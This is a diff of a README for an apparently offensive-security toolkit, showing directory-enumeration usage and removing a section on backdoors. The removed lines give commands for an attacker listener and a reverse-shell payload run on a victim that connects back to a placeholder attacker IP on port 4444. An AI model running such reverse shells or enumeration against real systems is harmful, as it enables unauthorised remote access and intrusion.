@@ -36,17 +36,6 @@ Downloads all JavaScript files from a website to analyze them for vulnerabilitie
 Searches for hidden folders on a website (e.g., /admin, /backup).
 `python web/directory_enumeration.py 192.168.1.1 -w resources/wordlists/common.txt`
 
-## 7. Backdoors (Remote Access) 🚪
-Tools to maintain remote access to a controlled machine.
-
-### Reverse Shell
-Establishes a reverse connection from the victim back to the attacker.
-
-1.  **On YOUR machine (Attacker):** Set up the listener.
-    `python backdoors/listener.py -p 4444`
-2.  **On the victim:** Run the payload to connect back.
-    `python backdoors/reverse_shell.py --ip <YOUR_IP> --port 4444`
-
 ---
 ---
 > **Note:**
